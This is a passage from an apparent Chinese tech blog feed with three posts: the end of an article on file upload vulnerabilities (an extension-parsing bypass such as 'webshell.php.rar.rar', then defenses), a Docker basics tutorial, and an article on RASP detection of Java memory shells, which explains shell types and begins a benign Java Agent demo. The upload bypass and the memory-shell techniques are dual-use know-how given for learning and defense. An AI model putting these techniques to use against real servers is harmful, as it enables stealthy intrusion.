并不认识 rar ，如果一个应用中要求用户上传rar，用户上传 <code>webshell.php.rar.rar</code>，可以通过安全检查，但实际容器中解析为PHP文件执行</li></ul></li><li><p><strong>IIS文件解析问题</strong></p><ul><li>场景：IIS是微软开发的一种web应用程序托管服务，曾出现过文件上传检查等问题</li></ul></li><li><p><strong>利用上传文件钓鱼</strong></p><p>黑客上传了一个bmp文件去正常的网站。然后传播这个合法图片的URL。</p><p>其实这个bmp文件中包含了恶意代码，指向钓鱼网站。</p></li></ol><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ol><li>文件上传的目录设置为不可执行<ul><li>只要web容器无法解析目录下的文件，即使攻击者上传了脚本文件，服务器也不会执行</li></ul></li><li>判断文件类型：结合使用MIME Type，后缀检查<ul><li>黑名单并不可行，使用白名单的方式</li><li>通过压缩函数处理图片，破坏图片中的HTML代码</li></ul></li><li>使用随机数改写文件名和文件路径<ul><li>在某些环境下，用户可以上传文件但并不能访问。可以使用随机数改写文件名和路径，使得用户无法访问到这个文件</li></ul></li><li>单独设置文件服务器的域名<ul><li>由于存在同源策略，一系列的客户端攻击失效。</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务端应用安全 </tag>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『Docker』Docker基础知识</title>
      <link href="/posts/9dd6.html"/>
      <url>/posts/9dd6.html</url>
      
        <content type="html"><![CDATA[<h1 id="docker简介"><a href="#docker简介" class="headerlink" title="docker简介"></a>docker简介</h1><h2 id="为什么我们需要docker"><a href="#为什么我们需要docker" class="headerlink" title="为什么我们需要docker"></a>为什么我们需要docker</h2><p>参考文章：<a src="https://zhuanlan.zhihu.com/p/187505981">什么是Docker？看这一篇干货文章就够了！</a></p><p>从开发到测试到运维，从头到尾搭建三套重复的运行环境，浪费时间和效率，还可能产生各种问题。</p><p>最初的解决方案：搭好一套虚拟机环境然后clone出来，但是存在很大的问题：每开发一个应用就需要部署一个新的虚拟机，且我们想要部署的是应用程序，虚拟机的操作系统所占用的资源是完全浪费掉的。</p><p>为了解决虚拟机存在的问题，诞生了容器技术。</p><h2 id="docker的原理"><a href="#docker的原理" class="headerlink" title="docker的原理"></a>docker的原理</h2><p>与虚拟机通过操作系统实现隔离不同，容器技术<strong>只隔离应用程序的运行时环境但容器之间可以共享同一个操作系统</strong>，这里的运行时环境指的是程序运行依赖的各种库以及配置。相比虚拟机，容器更加的<strong>轻量级且占用的资源更少</strong>。</p><blockquote><p>注意，容器是一种通用技术，docker只是其中的一种实现，可以让我们方便的创建和使用容器</p></blockquote><p>docker将程序以及程序所有的依赖都打包到docker container，这样你的程序可以在任何环境都会有一致的表现，这里程序运行的依赖也就是容器就好比集装箱，容器所处的操作系统环境就好比货船或港口，<strong>程序的表现只和集装箱有关系(容器)，和集装箱放在哪个货船或者哪个港口(操作系统)没有关系</strong>。</p><h2 id="dockerfile、image和container"><a href="#dockerfile、image和container" class="headerlink" title="dockerfile、image和container"></a>dockerfile、image和container</h2><p>docker中有这样几个概念，可以这样理解：</p><ul><li>dockerfile：指定程序依赖</li><li>image：即可执行程序</li><li>container：运行起来的进程</li></ul><p>写程序需要源代码，那么“写”image就需要dockerfile，dockerfile就是image的源代码，docker就是”编译器”。</p><p>因此我们只需要在dockerfile中指定需要哪些程序、依赖什么样的配置，之后把dockerfile交给“编译器”docker进行“编译”，也就是docker build命令，生成的可执行程序就是image，之后就可以运行这个image了，这就是docker run命令，image运行起来后就是docker container。</p><h1 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h1><p>linux环境下的docker安装教程：<a href="https://zhuanlan.zhihu.com/p/82269806">史上最全Docker环境安装指南</a></p><p>windows：<a href="https://zhuanlan.zhihu.com/p/441965046">https://zhuanlan.zhihu.com/p/441965046</a></p><h1 id="docker命令"><a href="#docker命令" class="headerlink" title="docker命令"></a>docker命令</h1><p>启动docker服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><h2 id="镜像命令"><a href="#镜像命令" class="headerlink" title="镜像命令"></a>镜像命令</h2><ol><li><p><strong>查看镜像</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看所有本地主机上的镜像</span></span><br><span class="line">docker images </span><br></pre></td></tr></table></figure><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240328154810691.png" alt="image-20240328154810691"></p></li><li><p><strong>下载镜像</strong></p><p>这里一般都是拉取<a href="https://hub.docker.com/%E4%B8%8A%E9%9D%A2%E5%B0%81%E8%A3%85%E5%A5%BD%E7%9A%84%E9%95%9C%E5%83%8F">https://hub.docker.com/上面封装好的镜像</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull 镜像名:版本号（默认为latest）</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull mysql:5.7</span><br><span class="line">docker pull docker.io/library/mysql:latest</span><br></pre></td></tr></table></figure></li><li><p><strong>删除镜像</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除指定的镜像</span></span><br><span class="line">docker rmi -f 镜像<span class="built_in">id</span>      </span><br><span class="line"><span class="comment"># 删除多个镜像</span></span><br><span class="line">docker rmi -f 镜像<span class="built_in">id</span> 镜像<span class="built_in">id</span> 镜像<span class="built_in">id</span> 镜像<span class="built_in">id</span>  </span><br></pre></td></tr></table></figure></li><li><p><strong>镜像的导入导出</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 讲本地镜像导出</span></span><br><span class="line">docker save -o 导出的路径 镜像<span class="built_in">id</span></span><br><span class="line"><span class="comment"># 加载本地的镜像文件</span></span><br><span class="line">docker load -i 镜像文件</span><br><span class="line"><span class="comment"># 修改镜像的名称</span></span><br><span class="line">docker tag 镜像<span class="built_in">id</span> 新镜像名称:版本</span><br></pre></td></tr></table></figure></li></ol><h2 id="容器命令"><a href="#容器命令" class="headerlink" title="容器命令"></a>容器命令</h2><ol><li><p><strong>列出所有正在运行的容器</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps </span><br></pre></td></tr></table></figure></li><li><p><strong>运行容器</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动容器</span></span><br><span class="line">docker run 容器<span class="built_in">id</span> </span><br></pre></td></tr></table></figure><ul><li><p>-v：指定本地项目目录与容器内的一个目录建立一个映射关系</p><p>例如：可以通过容器的 <code>/workspace</code> 目录访问本地的 <code>/path/to/your/project</code> 目录下的资源文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --<span class="built_in">rm</span> -v /path/to/your/project:/workspace -t linguist</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重启容器</span></span><br><span class="line">docker restart 容器<span class="built_in">id</span> </span><br><span class="line"><span class="comment"># 停止当前正在运行的容器</span></span><br><span class="line">docker stop 容器<span class="built_in">id</span> </span><br><span class="line"><span class="comment"># 强制停止当前容器</span></span><br><span class="line">docker <span class="built_in">kill</span> 容器<span class="built_in">id</span> </span><br></pre></td></tr></table></figure></li><li><p><strong>删除容器</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除指定容器</span></span><br><span class="line">docker <span class="built_in">rm</span> 容器<span class="built_in">id</span> </span><br></pre></td></tr></table></figure><blockquote><p>删除容器和删除镜像的区别：</p><p>删除容器是删除运行时的实例，而删除镜像是删除用于创建容器的基础文件。在删除镜像之前，您需要确保没有任何容器（无论是运行中的还是已停止的）仍在使用该镜像。</p></blockquote></li></ol><h1 id="Docker-Compose"><a href="#Docker-Compose" class="headerlink" title="Docker Compose"></a>Docker Compose</h1><p><strong>Docker Compose</strong> 是一个用于管理多容器 Docker 应用的工具，可以理解成是<strong>对 Docker 的进一步封装，帮助开发者以更简单的方式管理多个容器</strong>，适用于多服务应用。可以管理多个容器及其相互依赖性，一键配置所有服务，适合复杂开发环境。通常通过一个 <code>docker-compose.yml</code> 文件定义多容器的配置，包括镜像、网络、挂载卷、环境变量等。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>不能使用pip进行安装（版本过老，会与docker产生不兼容）、不能离线下载再上传到虚拟机（会产生segment error）</p><p>只能采用虚拟机直接在线下载安装的方式，参考：<a href="https://blog.csdn.net/Que_art/article/details/135192479">Docker Compose - 安装和基本使用</a></p><p>如果虚拟机下载速度太慢，可以考虑使用下面的代理镜像进行加速：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -SL https://mirror.ghproxy.com/https://github.com/docker/compose/releases/download/v2.24.1/docker-compose-`<span class="built_in">uname</span> -s`-`<span class="built_in">uname</span> -m` -o /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><ol><li><p>启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><ul><li><code>-d</code> ：让容器在后台运行，而不在当前终端显示容器的输出日志</li></ul></li><li><p>停止</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure></li></ol><h1 id="通过dockerfile创建镜像"><a href="#通过dockerfile创建镜像" class="headerlink" title="通过dockerfile创建镜像"></a>通过dockerfile创建镜像</h1><p>有的时候我们找到的开源项目在<a href="https://hub.docker.com/%E4%B8%8A%E9%9D%A2%E5%B9%B6%E6%B2%A1%E6%9C%89%E5%B0%81%E8%A3%85%E5%A5%BD%E7%9A%84%E9%95%9C%E5%83%8F%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%9C%A8%E5%85%B6%E9%A1%B9%E7%9B%AE%E7%9B%AE%E5%BD%95%E9%87%8C%E9%9D%A2%E6%89%BE%E5%88%B0">https://hub.docker.com/上面并没有封装好的镜像，但是我们可以在其项目目录里面找到</a> <code>dockerfile</code> ，说明其可以通过docker进行部署。</p><p>我们 <code>git clone</code> 下来项目之后，运行下面的命令根据当前目录下的dockerfile构建Docker镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build [OPTIONS] PATH | URL </span><br></pre></td></tr></table></figure><ul><li>PATH | URL ：表示dockerfile所在的路径</li><li>OPTIONS<ul><li>-t：指定镜像的名字</li></ul></li></ul><blockquote><p>构建容器的时候会依据dockerfile从Docker Hub上拉取对应的环境，所以我们并不需要提前搭建环境。</p></blockquote><p>例如：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240328161814685.png" alt="image-20240328161814685"></p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『Java内存马』RASP检测Java内存马</title>
      <link href="/posts/c2a6.html"/>
      <url>/posts/c2a6.html</url>
      
        <content type="html"><![CDATA[<h1 id="RASP基础知识"><a href="#RASP基础知识" class="headerlink" title="RASP基础知识"></a>RASP基础知识</h1><ol><li><p><strong>概念</strong></p><p>RASP（Runtime application self-protection，运行时程序自动保护技术）是一种新型应用安全保护技术，它将保护程序像疫苗一样注入到应用程序中，内置或链接到应用程序环境中与应用程序融为一体，能实时检测和阻断安全攻击，使应用程序具备自我保护能力。</p></li><li><p><strong>WAF和RASP的区别：</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241108155143568.png" alt="image-20241108155143568"></p><ul><li>WAF是<strong>位于Web应用和客户端之间的安全网关</strong>，用于检测和防御来自网络层和应用层的攻击。且WAF大部分是<strong>基于规则</strong>去拦截，你的请求参数在规则中存在即拦截，误报率高。</li><li>RASP是一种<strong>嵌入在Web应用程序中的安全技术</strong>，在应用的运行时环境内工作，利用应用上下文信息来检测并防御攻击行为，工作在应用层。</li></ul><blockquote><p>以防御SQL注入为例：</p><ul><li>WAF：预定义规则库，匹配HTTP请求数据包参数字段中是否存在SQL注入的特征模式。可能被绕过措施绕过、误报率高</li><li>RASP：动态监控应用的实际运行行为。在应用程序将sql语句预编译完视图访问数据库资源时，RASP可以在其发送之前将其拦截进行检测，如果sql语句没有危险操作，则正常放行，不会影响程序本身的功能。</li></ul></blockquote></li><li><p><strong>部署方法</strong></p><p>RASP工作在应用层，因此每个产品都需要以某种方式与应用程序集成。监控应用程序使用（调用）或执行（运行时）的方法有多种，每种方法的部署略有不同，收集的应用程序运行方式略有不同。</p><ul><li><p>Servlet 过滤器和插件：一些RASP平台作为Web服务器插件或Java Servlet实现，通常安装到Apache Tomcat或 Microsoft .NET中以处理入站HTTP请求。插件在到达应用程序代码之前过滤请求，将检测规则应用于收到的每个入站请求。</p><blockquote><p>这种部署方式和WAF比较类似。WAF部署位置为应用程序之外，作为代理处理流量；RASP的这种部署方式位于应用入口，可以了解 Web 应用的基本结构（例如 URL 路由、参数类型等），但对更深层的运行逻辑仍然无法完全感知。</p><p>但是相比WAF的检测深度更高，WAF只能根据数据包模式或其他特征进行检测，但 <strong>这种rasp可以利用服务器端环境</strong> 来进一步理解请求的上下文，比如请求头、请求体、甚至可能的用户会话信息（即<strong>可以接触到明文信息</strong>）。</p></blockquote></li><li><p>库&#x2F;JVM替换：通过替换标准应用程序库、JAR文件甚至Java虚拟机来安装某些RASP产品。在此模型下，RASP工具可以全面了解应用程序代码路径和系统调用，甚至可以学习状态机或序列行为。可以更深入的分析程序上下文，允许更细粒度的检测规则。</p><ul><li>检测规则可以基于更加丰富的上下文信息，如调用栈、数据流等。</li></ul></li><li><p>虚拟化或复制：创建应用程序的副本，通常为虚拟化容器、流量镜像、云实例等。在副本中隔离运行并检测应用程序行为，并阻止恶意或格式错误的请求。</p><ul><li>异步处理或并行分析，加快响应速度</li><li>主环境配置基本防护策略（如 WAF），减少发送到副本的无意义流量，避免资源浪费</li></ul></li></ul></li><li><p><strong>优势</strong></p><ul><li>RASP具有更高的准确性，因为它可以洞察应用程序逻辑和配置、事件和数据流、执行的指令和数据处理。而且在预生产中很容易部署，能成功阻止攻击。</li><li>RASP具有动态分析和上下文感知能力，可以更好地防御针对业务逻辑的攻击，包括高级攻击和零日漏洞等。</li><li>通过嵌入应用实现保护，适合云原生和微服务架构，便于集成。</li></ul></li><li><p><strong>国内外产品</strong>：<a href="https://www.freebuf.com/articles/web/197823.html">浅谈RASP技术攻防之基础篇</a></p><ul><li>百度OpenRasp：<a href="https://rasp.baidu.com/">rasp.baidu.com</a> </li><li>蚂蚁RASP：<a href="https://help.aliyun.com/zh/security-center/user-guide/learn-about-application-protection">应用防护RASP介绍_云安全中心(Security Center)-阿里云帮助中心</a></li><li>云鲨RASP：<a href="https://rasp.xmirror.cn/">悬镜安全 - 代码疫苗内核驱动的新一代应用威胁自免疫平台</a></li><li>Micro Focus：<a href="https://www.microfocus.com/en-us/products/application-defender/features">OpenText Cybersecurity Cloud solutions</a></li></ul></li><li><p><strong>资源</strong></p><ul><li>开源项目<ul><li><a href="https://github.com/btraceio/btrace">https://github.com/btraceio/btrace</a></li></ul></li><li>性能优化：<ul><li><a href="https://tech.meituan.com/2024/01/19/runtime-application-self-protection-practice-in-meituan.html">美团RASP大规模研发部署实践总结</a></li></ul></li></ul></li><li><p><strong>检测内存马</strong></p><ul><li>Attach 检测jar包到JVM进程</li><li>获取JVM中已经加载的class列表</li><li>根据以上可疑特征将可疑的class反编译为Java源码</li><li>根据源码检测Webshell</li></ul></li></ol><h1 id="Java内存马"><a href="#Java内存马" class="headerlink" title="Java内存马"></a>Java内存马</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ol><li><p><strong>概念</strong></p><p>Java内存马（Java Memory Shell）是一种攻击手段，通常利用java的动态加载机制，在Java应用程序的内存中动态生成或加载恶意的Java对象或类，确保恶意代码在java应用内存中主流、执行，从而在不修改服务器文件系统的情况下保持对目标系统的持久访问，同时避免传统文件检测工具的发现。</p></li><li><p><strong>例子</strong></p><p>攻击者通过反射或内存操作（如<code>setAttribute()</code>）将恶意Servlet注入到当前Web应用的<code>ServletContext</code>中，并动态映射到指定的URL路径（如<code>/memory</code>），而无需在服务器的<code>WEB-INF/classes</code>或<code>WEB-INF/lib</code>目录中添加任何文件。</p><p>例如：</p><ul><li><p><strong>动态添加组件</strong>：通过Java代码或脚本直接向Web服务器中添加一个Servlet、Filter或Listener。由于这些组件是在内存中注册的，不会涉及磁盘操作。</p></li><li><p><strong>类加载器挂钩</strong>：通过修改或替换ClassLoader，使其在加载指定类时附加恶意功能。此方法也不会创建新的文件，只是在内存中操作类对象。</p></li></ul><p>由于内存马不需要在磁盘上留下任何恶意文件，只要它被加载到内存中运行，就可以在不触发文件系统检测的情况下持久驻留在目标系统中。这种特性使得内存马具有高度的隐蔽性。</p><blockquote><ul><li><a href="https://www.anquanke.com/post/id/273250">Java内存马攻防实战——攻击基础篇</a></li><li><a href="https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw">Tomcat 源代码调试笔记 - 看不见的 Shell</a></li></ul></blockquote></li><li><p><strong>使用场景（优势）</strong></p><ul><li>由于网络原因不能反弹 shell 的；</li><li>内部主机通过反向代理暴露 Web 端口的；</li><li>服务器上有防篡改、目录监控等防御措施，禁止文件写入的；</li><li>服务器上有其他监控手段，写马后会告警监控，人工响应的；</li><li>服务使用 Springboot 等框架，无法解析传统 Webshell 的；</li></ul></li><li><p><strong>缺点</strong></p><ul><li>服务重启后会失效；</li><li>对于传统内存马，存在的位置相对固定，已经有相关的查杀技术可以检出。</li></ul></li></ol><h2 id="java内存马的分类"><a href="#java内存马的分类" class="headerlink" title="java内存马的分类"></a>java内存马的分类</h2><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241025163717595.png" alt="image-20241025163717595"></p><ol><li><p><strong>传统web应用型内存马</strong></p><p>使用基本Servlet-API实现的动态注册内存马，此种类型的内存马最经典，已经被扩展至适应各个中间件。</p><ul><li><p><strong>Servlet型内存马</strong>：将恶意的<code>Servlet</code>对象动态注册到Web容器（如Tomcat、Jetty、JBoss等）的内存中。恶意Servlet一旦注册，攻击者可以通过特定URL直接访问它，从而执行进一步的攻击操作。</p></li><li><p><strong>Filter型内存马</strong>：通过动态添加过滤器（Filter）的方式，将恶意的Filter注入到应用中。这种内存马会对所有HTTP请求和响应进行拦截和处理，可以用于窃取、篡改或注入恶意数据。</p></li><li><p><strong>Listener型内存马</strong>：动态注册恶意的事件监听器（Listener），监听应用中各类事件（如Session创建、销毁事件等），从而在特定事件发生时执行恶意代码。</p></li></ul><blockquote><p>JavaWeb应用会将Servlet、Filter、Listener及其映射放在Context中，并在程序运行时进行查找和匹配。注入后，这些组件被挂载到Web应用的Context中，从而<strong>允许攻击者在不修改磁盘文件的情况下，通过特定的URL或请求路径触发恶意代码的执行</strong>。通过内存马的动态注册，这些恶意代码能够绕过文件系统的本地存储，不会在配置文件中留下任何可见的恶意设置，从而具有很强的隐蔽性和持久性。</p></blockquote></li><li><p><strong>框架型内存马</strong></p><p>框架性内存马是利用Web框架（如Spring、Struts、Shiro等）的特性进行持久化攻击的手段，其主要目的是利用框架的动态注册机制，将恶意代码注入到内存中，进行隐蔽的持久化控制。</p><p>例如：Spring框架内存马通过动态注册<strong>Spring的核心组件（如Controller、Filter、Interceptor、WebFilter等）</strong>，将恶意代码注入到应用的上下文中。</p></li><li><p><strong>中间件型内存马</strong></p><p>中间件通常以流式和管道式方式处理请求，每个组件在处理完请求后会将其传递给下一个组件。这种设计模式为攻击者提供了多个插入点，攻击者可以在请求链的任意位置动态注入恶意组件。</p><p>在中间件的很多功能实现上，因为采用了类似 Filter-FilterChain 的职责链模式，可以被用来做内存马，由于行业对 Tomcat 的研究较多，因此大多数的技术实现和探究是针对 Tomcat 的，但其他中间件也有相当多的探究空间。</p></li><li><p><strong>Agent 型内存马</strong></p><p>通过Java的<code>Java Agent</code>机制来注入恶意代码的一种内存马形式。它利用JVM的<code>Instrumentation API</code> 来实现对应用程序类的修改、增强或替换，从而达到持久化控制和隐蔽攻击的目的。这种内存马在JVM启动时加载，并在整个JVM生命周期内驻留，是一种极具隐蔽性和持久性的内存马攻击手段。</p></li><li><p><strong>其他内存马</strong></p><p>还有一些其他非常规的利用思路，可以用在内存马的实现上，例如 WebSocket 协议等。</p></li></ol><p>但实际上，内存马的深度和广度完全不局限于此，还有很多思路可以用来进行<strong>内存马的扩展</strong>：</p><ul><li>对于 Agent 型内存马，可以 hook 非常多的位置，如各种 SPI 的实现，可以接管整个 JVM，获取数据；</li><li>除了基于 Web 协议的内存马，可以使用各种协议作为内存马的通信途径，如 grpc、jmx、jpda 等，或封装多层协议；</li><li>对于各种中间件&#x2F;框架，利用其设计模式，可挖掘出多种内存马的利用方式。</li></ul><p>除了按照内存马的实现方式分类，还可以按照内存马的利用方式分为：冰蝎马、哥斯拉马、蚁剑马、命令回显马、流量隧道马等等。</p><h1 id="Java-Agent型内存马"><a href="#Java-Agent型内存马" class="headerlink" title="Java Agent型内存马"></a>Java Agent型内存马</h1><h2 id="Java-Agent"><a href="#Java-Agent" class="headerlink" title="Java Agent"></a>Java Agent</h2><ol><li><p><strong>概念</strong></p><p>Java Agent是JVM提供的一种机制，用于在Java应用程序启动时或运行时动态地修改、监控和管理类的字节码。它主要通过Java的<strong>Instrumentation</strong> <strong>API</strong>来实现，能在不停止应用程序的情况下动态修改已加载或者未加载的类，一般用于实现性能监控、调试、AOP（面向切面编程）、字节码增强等功能。</p></li><li><p><strong>使用方式</strong></p><p>Java Agent的使用方式有两种：</p><ul><li><p><strong>premain，在JVM启动前加载</strong></p><p>启动时配置 <code>-javaagent</code> 参数，会执行Agent中的premain方法。JVM启动时 会先执行<code>premain</code>方法，大部分类加载都会通过该方法，注意：是大部分，不是所有。因为很多系统类先于 agent 执行，而用户类的加载肯定是会被拦截的。也就是说，<strong>这个方法是在 main 方法启动前拦截大部分类的加载活动</strong>，既然可以拦截类的加载，就可以结合第三方的字节码编译工具，比如ASM，javassist，cglib等来改写实现类。</p></li><li><p><strong>agentmain，在JVM启动后加载</strong></p><p>首先使用Attach API将java agent动态附加到运行中的目标JVM上（建立连接），然后使用com.sun.tools.attach.VirtualMachine包提供的loadAgent方法，将指定的 Java Agent JAR 文件加载到目标 JVM 中，从而启动该 JAR 文件中定义的 <code>agentmain</code> 方法，调用<code>Instrumentation API</code> 对目标 JVM 进行字节码修改等操作。</p></li></ul></li></ol><h3 id="premain-方法"><a href="#premain-方法" class="headerlink" title="premain 方法"></a>premain 方法</h3><p>JVM启动时会先执行<code>premain</code>方法，即：在 main 方法启动前通过premain方法拦截大部分类的加载活动（用户类的加载肯定会被拦截，但是很多系统类先于agent执行，并不会被拦截），后续就可以结合第三方的字节码编译工具，比如ASM，javassist，cglib等来改写实现类。</p><p>启动时配置 <code>-javaagent</code> 参数，会执行Agent中的premain方法。</p><p><img src="https://scu-sec-lab.feishu.cn/space/api/box/stream/download/asynccode/?code=MjM0ZTQxYzJhMWNlY2E0MDU0NjI0ZTZhNzA2YzJhZmNfcWd0ZzEwdGNMOE5XNmJ5TzM1ejVHRVNScU9UdTRQeExfVG9rZW46Q1ZsdmJKVXp4b001M3B4TVNFWmM4dFVSbldlXzE3MzM0NTM2OTk6MTczMzQ1NzI5OV9WNA" alt="img"></p><h3 id="agentmain方法"><a href="#agentmain方法" class="headerlink" title="agentmain方法"></a>agentmain方法</h3><p>例子：</p><ol><li><p><strong>编写 <code>hello.jar</code></strong></p><p>文件结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hello_project/</span><br><span class="line">├── src</span><br><span class="line">│   └── com</span><br><span class="line">│       └── test</span><br><span class="line">│          ├── HelloWorld.java</span><br><span class="line">│           ├── hello.java</span><br><span class="line">│           ├── GetPid.java</span><br><span class="line">│           └── MANIFEST.MF</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong><code>HelloWorld.java</code></strong>：主程序，用于启动并输出进程ID，等待用户输入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">hello</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">hello</span>();</span><br><span class="line">        <span class="type">GetPid</span> <span class="variable">pid</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GetPid</span>();</span><br><span class="line">        h1.hello();</span><br><span class="line">        pid.GetPid();   <span class="comment">// 打印当前的进程ID</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        sc.nextInt();  <span class="comment">// 暂停等待输入 便于后续注入</span></span><br><span class="line">        <span class="type">hello</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">hello</span>();</span><br><span class="line">        h2.hello();</span><br><span class="line">        System.out.println(<span class="string">&quot;ends&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>hello.java</code></strong>：简单的类，用于输出“hello world”。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>GetPid.java</code></strong>：获取当前JVM进程的名称和PID。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.management.ManagementFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetPid</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">GetPid</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> ManagementFactory.getRuntimeMXBean().getName();</span><br><span class="line">        System.out.println(<span class="string">&quot;JVM:&quot;</span> + name);</span><br><span class="line">        <span class="type">String</span> <span class="variable">pid</span> <span class="operator">=</span> name.split(<span class="string">&quot;@&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">        System.out.println(<span class="string">&quot;PID:&quot;</span> + pid);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>打包 